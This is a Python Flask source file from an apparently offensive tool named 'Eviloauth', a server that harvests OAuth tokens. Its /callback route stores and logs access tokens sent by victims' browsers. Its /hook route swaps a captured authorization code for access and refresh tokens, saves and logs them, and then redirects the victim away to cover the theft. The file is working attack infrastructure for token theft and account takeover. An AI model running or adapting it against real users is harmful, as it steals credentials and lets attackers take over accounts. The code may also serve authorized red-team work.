import logging
import requests
from eviloauth import app, cache
from eviloauth.general_token import GeneralToken
from flask import jsonify, render_template, request, redirect as flask_redirect


@app.route('/')
def home():
    return 'Eviloauth'


@app.route('/callback', methods=['POST'])
def callback():
    access_token = request.json.get('access_token')  # type: ignore

    if access_token:
        try:
            general_token = GeneralToken(access_token=access_token)
            general_tokens = cache.get('tokens')
            general_tokens.update({str(general_token): general_token})
            cache.set('tokens', general_tokens)

            logging.info("Access Token: %s", access_token)
            return jsonify({'status': 'success', 'message': 'Token received', 'data': str(access_token)})
        except ValueError as e:
            logging.error('Cannot process_token %s', e)
            return jsonify({'status': 'error', 'message': str(e)}), 400
    else:
        logging.error('Callback didn\'t receive access_token')
        return jsonify({'status': 'error', 'message': 'No token provided'}), 400


@app.route(f'/redirect', methods=['GET'])
def redirect():
    final_destination = app.config.get('FINAL_DESTINATION')
    return render_template('redirect.html', final_destination=final_destination)


@app.route(f'/hook', methods=['GET'])
def hook():
    code = request.args.get('code')
    state = request.args.get('state')
    session_state = request.args.get('session_state')

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': '*'
    }

    client_id = app.config.get('CLIENT_ID')
    redirect_uri = app.config.get('REDIRECT_URI')
    code_verifier = app.config.get('CODE_VERIFIER')
    scope = app.config.get('SCOPE')

    data = {
        'client_id': client_id,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': redirect_uri,
        'code_verifier': code_verifier,
        'scope': scope
    }
    response = requests.post(app.config.get(
        'TOKEN_ENDPOINT'), headers=headers, data=data)

    token_type = response.json()["token_type"]
    scope = response.json()["scope"]
    expires_in = response.json()["expires_in"]
    ext_expires_in = response.json()["ext_expires_in"]
    access_token = response.json()["access_token"]
    refresh_token = response.json()["refresh_token"]

    general_token = GeneralToken(access_token=access_token,
                                 refresh_token=refresh_token,
                                 client_id=client_id,
                                 code=code,
                                 redirect_uri=redirect_uri,
                                 code_verifier=code_verifier,
                                 scope=scope,
                                 token_endpoint=app.config.get(
                                     'TOKEN_ENDPOINT'),
                                 token_type=token_type,
                                 expires_in=expires_in,
                                 ext_expires_in=ext_expires_in)

    general_tokens = cache.get('tokens')
    general_tokens.update({str(general_token): general_token})
    cache.set('tokens', general_tokens)
    logging.info("Access Token: %s", access_token)
    logging.info("Refresh Token: %s", refresh_token)

    return flask_redirect(app.config.get('FINAL_DESTINATION'))
